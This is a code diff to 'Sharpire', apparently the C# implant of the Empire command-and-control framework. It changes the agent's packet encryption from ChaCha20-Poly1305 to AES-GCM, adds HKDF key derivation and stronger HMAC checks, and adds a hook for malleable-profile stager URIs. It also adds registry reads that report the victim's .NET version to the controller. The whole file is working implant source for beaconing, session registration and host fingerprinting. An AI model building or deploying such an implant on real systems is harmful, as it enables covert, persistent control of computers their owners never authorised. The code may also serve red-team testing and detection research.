@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Linq;
 using System.Management;
+using Microsoft.Win32;
 using System.Management.Automation.Runspaces;
 using System.Net;
 using System.Diagnostics;
@@ -8,7 +9,7 @@ using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Numerics;
-using ChaChaEncryption;
+using AesGcmEncryption;
 using System.Runtime.CompilerServices;
 
 namespace Sharpire
@@ -59,8 +60,8 @@ namespace Sharpire
             byte[] rawSharedSecretBytes = sharedSecret.ToByteArray();
             Array.Reverse(rawSharedSecretBytes);
 
-            // Always normalize to 6147 bytes
-            int expectedLength = 6147;
+            // Normalize to 768 bytes (6144-bit DH prime / 8)
+            int expectedLength = 768;
             if (rawSharedSecretBytes.Length < expectedLength)
             {
                 byte[] padded = new byte[expectedLength];
@@ -77,10 +78,41 @@ namespace Sharpire
             }
 
 
-            using (SHA256 sha256 = SHA256.Create())
+            AesKey = HkdfSha256(
+                rawSharedSecretBytes,
+                null,
+                System.Text.Encoding.ASCII.GetBytes("empire-session-key"),
+                32
+            );
+        }
+
+        // Single-block HKDF-SHA256 (supports output up to 32 bytes only)
+        private static byte[] HkdfSha256(byte[] ikm, byte[] salt, byte[] info, int length)
+        {
+            if (length > 32)
+                throw new ArgumentOutOfRangeException(nameof(length), "Single-block HKDF supports up to 32 bytes.");
+
+            // Extract: PRK = HMAC-SHA256(salt, IKM)
+            if (salt == null) salt = new byte[32];
+            byte[] prk;
+            using (var hmac = new HMACSHA256(salt)) { prk = hmac.ComputeHash(ikm); }
+
+            // Expand: T(1) = HMAC-SHA256(PRK, info || 0x01)
+            byte[] input = new byte[info.Length + 1];
+            Array.Copy(info, 0, input, 0, info.Length);
+            input[input.Length - 1] = 0x01;
+            byte[] result;
+            using (var hmac = new HMACSHA256(prk)) { result = hmac.ComputeHash(input); }
+            Array.Clear(prk, 0, prk.Length);
+
+            if (length < 32)
             {
-                AesKey = sha256.ComputeHash(rawSharedSecretBytes);
+                byte[] truncated = new byte[length];
+                Array.Copy(result, truncated, length);
+                Array.Clear(result, 0, result.Length);
+                return truncated;
             }
+            return result;
         }
 
         private static BigInteger GenerateRandomBigInteger()
@@ -104,7 +136,10 @@ namespace Sharpire
         }
     }
 
-    class EmpireStager
+    // Partial so the optional SharpireMalleable source library can extend
+    // PickStagerUri with profile-aware stager URI selection without the base
+    // build referencing any malleable types.
+    partial class EmpireStager
     {
         private SessionInfo sessionInfo;
 
@@ -203,32 +238,30 @@ namespace Sharpire
 
         public static byte[] BuildRoutingPacket(byte[] key, string sessionId, int meta, byte[] encryptedBytes)
         /*
-        Constructs a routing packet with chacha20poly1305 encryption.
-        
+        Constructs a routing packet with AES-GCM encryption.
+
         Packet format:
 
-        Nonce: Nonce used by ChaCha20Poly1305
-        ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+        Nonce: Nonce used by AES-GCM
+        AES-GCM(Routing Data): Encrypted RoutingData with associated GCM tag
         AESc = AES encrypted using the client's session key
-        ChaCha20(RoutingData): Encrypted RoutingData
-        Poly1305(RoutingData): Poly1305 tag of RoutingData
 
 
             Routing Packet:
-            +---------+--------------------------------+--------------------------+
-            |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
-            +---------+--------------------------------+--------------------------+
-            |    12   |                32              |          length          |
-            +---------+--------------------------------+--------------------------+
+            +---------+---------------------------+--------------------------+
+            |  Nonce  |  AES-GCM(RoutingData)     | AESc(client packet data) | ...
+            +---------+---------------------------+--------------------------+
+            |    12   |             32            |          length          |
+            +---------+---------------------------+--------------------------+
 
-                ChaCha20+Poly1305(RoutingData):
+                AES-GCM(RoutingData):
                 +---------------------------+---------------------------+
-                |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+                |   AES-GCM Ciphertext      |       AES-GCM Tag         |
                 +---------------------------+---------------------------+
                 |           16              |            16             |
                 +---------------------------+---------------------------+
 
-                    RoutingData:
+                    RoutingData (plaintext):
                     +-----------+------+------+-------+--------+
                     | SessionID | Lang | Meta | Extra | Length |
                     +-----------+------+------+-------+--------+
@@ -249,15 +282,15 @@ namespace Sharpire
             data = Misc.combine(data, new byte[4] { lang, Convert.ToByte(meta), 0x00, 0x00 });
             data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));
 
-            //encrypt it in chacha20poly1305 
-            byte[] chacha_nonce = NewInitializationVector(12);
-            byte[] poly1305_tag = new byte[16];
-            byte[] chacha_data = new byte[data.Length];
-            ChaCha20Poly1305.Encrypt(key, chacha_nonce, data, out chacha_data, out poly1305_tag);
+            //encrypt it with AES-GCM
+            byte[] gcm_nonce = NewInitializationVector(12);
+            byte[] gcm_tag = new byte[16];
+            byte[] gcm_ciphertext = new byte[data.Length];
+            AesGcm.Encrypt(key, gcm_nonce, data, out gcm_ciphertext, out gcm_tag);
 
-            //combine the chacha20 encrypted data with its associated poly1305 tag, to make ChaCha20Poly1305(RoutingData)
-            byte[] chacha_poly1305_data = Misc.combine(chacha_data, poly1305_tag);
-            byte[] routingPacketData = Misc.combine(chacha_nonce, chacha_poly1305_data);
+            //combine the AES-GCM ciphertext with its associated GCM tag
+            byte[] gcm_encrypted_data = Misc.combine(gcm_ciphertext, gcm_tag);
+            byte[] routingPacketData = Misc.combine(gcm_nonce, gcm_encrypted_data);
 
             //If we have encrypted bytes (AESc), append those to the end
             if (encryptedBytes != null)
@@ -310,8 +343,7 @@ namespace Sharpire
 
             byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, "00000000", 2, hmacData);
 
-            Random random = new Random();
-            byte[] response = SendData(sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)], routingPacket);
+            byte[] response = SendData(PickStagerUri(), routingPacket);
 
             RoutingPacket packet = DecodeRoutingPacket(response);
             sessionInfo.SetAgentId(packet.SessionId);
@@ -330,32 +362,30 @@ namespace Sharpire
 
         private RoutingPacket DecodeRoutingPacket(byte[] packetData)
         /*
-       Decodes a chacha20poly1305 encrypted routing packet to a normal routing packet
+       Decodes an AES-GCM encrypted routing packet to a normal routing packet
 
        Packet format:
 
-       Nonce: Nonce used by ChaCha20Poly1305
-       ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+       Nonce: Nonce used by AES-GCM
+       AES-GCM(Routing Data): Encrypted RoutingData with associated GCM tag
        AESc = AES encrypted using the client's session key
-       ChaCha20(RoutingData): Encrypted RoutingData
-       Poly1305(RoutingData): Poly1305 tag of RoutingData
 
 
            Routing Packet:
-           +---------+--------------------------------+--------------------------+
-           |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
-           +---------+--------------------------------+--------------------------+
-           |    12   |                32              |          length          |
-           +---------+--------------------------------+--------------------------+
+           +---------+---------------------------+--------------------------+
+           |  Nonce  |  AES-GCM(RoutingData)     | AESc(client packet data) | ...
+           +---------+---------------------------+--------------------------+
+           |    12   |             32            |          length          |
+           +---------+---------------------------+--------------------------+
 
-               ChaCha20+Poly1305(RoutingData):
+               AES-GCM(RoutingData):
                +---------------------------+---------------------------+
-               |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+               |   AES-GCM Ciphertext      |       AES-GCM Tag         |
                +---------------------------+---------------------------+
                |           16              |            16             |
                +---------------------------+---------------------------+
 
-                   RoutingData:
+                   RoutingData (plaintext):
                    +-----------+------+------+-------+--------+
                    | SessionID | Lang | Meta | Extra | Length |
                    +-----------+------+------+-------+--------+
@@ -368,10 +398,10 @@ namespace Sharpire
            Extra = reserved for future expansion
        */
         {
-            // define packet structure for ChaCha20Poly1305 (12 byte nonce + 32 bytes for encrypted data and tag. Together is 40 byte header before AESc)
+            // define packet structure for AES-GCM (12 byte nonce + 32 bytes for encrypted data and tag. Together is 44 byte header before AESc)
             int nonce_length = 12;
-            int chacha_header_length = nonce_length + 32;
-            if (packetData.Length < chacha_header_length)
+            int gcm_header_length = nonce_length + 32;
+            if (packetData.Length < gcm_header_length)
             {
                 return null;
             }
@@ -381,19 +411,19 @@ namespace Sharpire
             while (offset < packetData.Length)
             {
                 // parse given packet
-                byte[] routingPacket = packetData.Skip(offset).Take(chacha_header_length).ToArray();
-                byte[] chachaNonce = routingPacket.Take(nonce_length).ToArray();
-                byte[] routingChachaData = routingPacket.Skip(nonce_length).Take(32).ToArray(); // chacha20 encrypted data and poly1305 tag
-                offset += chacha_header_length;
+                byte[] routingPacket = packetData.Skip(offset).Take(gcm_header_length).ToArray();
+                byte[] gcmNonce = routingPacket.Take(nonce_length).ToArray();
+                byte[] routingGcmData = routingPacket.Skip(nonce_length).Take(32).ToArray(); // AES-GCM ciphertext and GCM tag
+                offset += gcm_header_length;
 
                 // Prep data for decryption
                 byte[] key = sessionInfo.GetStagingKeyBytes();
-                byte[] chachaData = routingChachaData.Take(16).ToArray();
-                byte[] poly1305Tag = routingChachaData.Skip(16).Take(16).ToArray();
+                byte[] gcmCiphertext = routingGcmData.Take(16).ToArray();
+                byte[] gcmTag = routingGcmData.Skip(16).Take(16).ToArray();
 
                 // decrypt encrypted data into routingData
                 byte[] routingData = new byte[16];
-                ChaCha20Poly1305.Decrypt(key, chachaNonce, chachaData, poly1305Tag, out routingData);
+                AesGcm.Decrypt(key, gcmNonce, gcmCiphertext, gcmTag, out routingData);
 
                 // parse/handle routing data
                 if (routingData.Length < 16)
@@ -417,7 +447,7 @@ namespace Sharpire
                 // return the new routing packet
                 return new RoutingPacket
                 {
-                    InitializationVector = chachaNonce,
+                    InitializationVector = gcmNonce,
                     EncryptedData = encryptedData,
                     DecryptedData = null,
                     SessionId = packetSessionId,
@@ -445,9 +475,30 @@ namespace Sharpire
 
             byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, sessionInfo.GetAgentId(), 3, encryptedData);
 
-            Random random = new Random();
-            SendData(sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)], routingPacket);
+            SendData(PickStagerUri(), routingPacket);
         }
+
+        // Pick the URI to POST stage1 / stage2 routing packets to. When a
+        // malleable profile is in play, the server routes stager POSTs via
+        // profile.stager.client.uris — hitting a task URI (GetTaskUrIs) would
+        // land on profile.post instead and crash the server's extract path.
+        // The SharpireMalleable source library implements
+        // TryPickMalleableStagerUri to set `chosen` from the profile;
+        // otherwise this falls back to the legacy random-task-URI behavior.
+        private string PickStagerUri()
+        {
+            string chosen = null;
+            TryPickMalleableStagerUri(ref chosen);
+            if (chosen != null) return chosen;
+
+            string[] taskUris = sessionInfo.GetTaskUrIs();
+            Random rand = new Random();
+            return taskUris[rand.Next(0, taskUris.Length)];
+        }
+
+        // Hook implemented by SharpireMalleable/Empire.Agent.Malleable.cs when
+        // the malleable source library is compiled in. No-op otherwise.
+        partial void TryPickMalleableStagerUri(ref string chosen);
 
         private void DotNetEmpire()
         {
@@ -541,11 +592,60 @@ namespace Sharpire
             Process process = Process.GetCurrentProcess();
             information += process.ProcessName + "|";
             information += process.Id + "|";
-            //TODO fix this from being hard coded  
+            //TODO fix this from being hard coded
             information += "csharp|5";
             information += "|" + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
+            information += "|" + GetDotNetVersion();
 
             return Encoding.ASCII.GetBytes(information);
+        }
+
+        private static string GetDotNetVersion()
+        {
+            try
+            {
+                string clr4 = "";
+                string clr2 = "";
+
+                using (RegistryKey v4Full = Registry.LocalMachine.OpenSubKey(
+                    @"SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"))
+                {
+                    if (v4Full != null && (int)(v4Full.GetValue("Install", 0)) == 1)
+                    {
+                        int release = (int)(v4Full.GetValue("Release", 0));
+                        if (release >= 528040) clr4 = "net48";
+                        else if (release >= 460798) clr4 = "net47";
+                        else if (release >= 393295) clr4 = "net46";
+                        else clr4 = "net45";
+                    }
+                }
+
+                if (string.IsNullOrEmpty(clr4))
+                {
+                    using (RegistryKey v4 = Registry.LocalMachine.OpenSubKey(
+                        @"SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0"))
+                    {
+                        if (v4 != null && (int)(v4.GetValue("Install", 0)) == 1)
+                            clr4 = "net40";
+                    }
+                }
+
+                using (RegistryKey v35 = Registry.LocalMachine.OpenSubKey(
+                    @"SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5"))
+                {
+                    if (v35 != null && (int)(v35.GetValue("Install", 0)) == 1)
+                        clr2 = "net35";
+                }
+
+                if (!string.IsNullOrEmpty(clr4) && !string.IsNullOrEmpty(clr2))
+                    return clr4 + ",net35";
+                if (!string.IsNullOrEmpty(clr4))
+                    return clr4;
+                if (!string.IsNullOrEmpty(clr2))
+                    return clr2;
+            }
+            catch { }
+            return "";
         }
 
         public static byte[] rc4Encrypt(byte[] RC4Key, byte[] data)
@@ -594,7 +694,7 @@ namespace Sharpire
 
             using (HMACSHA256 hmac = new HMACSHA256(key))
             {
-                byte[] hmacHash = hmac.ComputeHash(encrypted).Take(10).ToArray();
+                byte[] hmacHash = hmac.ComputeHash(encrypted).Take(16).ToArray();
                 return Misc.combine(encrypted, hmacHash);
             }
         }
@@ -614,15 +714,27 @@ namespace Sharpire
             return encryptedBytes;
         }
 
+        private static bool ConstantTimeEquals(byte[] a, byte[] b)
+        {
+            if (a.Length != b.Length) return false;
+            int diff = 0;
+            for (int i = 0; i < a.Length; i++)
+                diff |= a[i] ^ b[i];
+            return diff == 0;
+        }
+
         public static byte[] AesDecryptAndVerify(byte[] key, byte[] data)
         {
-            byte[] hmacReceived = data.Skip(data.Length - 10).Take(10).ToArray();
-            byte[] encrypted = data.Take(data.Length - 10).ToArray();
+            if (data == null || data.Length < 48)
+                throw new CryptographicException("Encrypted data too short.");
+
+            byte[] hmacReceived = data.Skip(data.Length - 16).Take(16).ToArray();
+            byte[] encrypted = data.Take(data.Length - 16).ToArray();
 
             using (HMACSHA256 hmac = new HMACSHA256(key))
             {
-                byte[] hmacComputed = hmac.ComputeHash(encrypted).Take(10).ToArray();
-                if (!hmacComputed.SequenceEqual(hmacReceived))
+                byte[] hmacComputed = hmac.ComputeHash(encrypted).Take(16).ToArray();
+                if (!ConstantTimeEquals(hmacComputed, hmacReceived))
                 {
                     throw new CryptographicException("HMAC verification failed.");
                 }
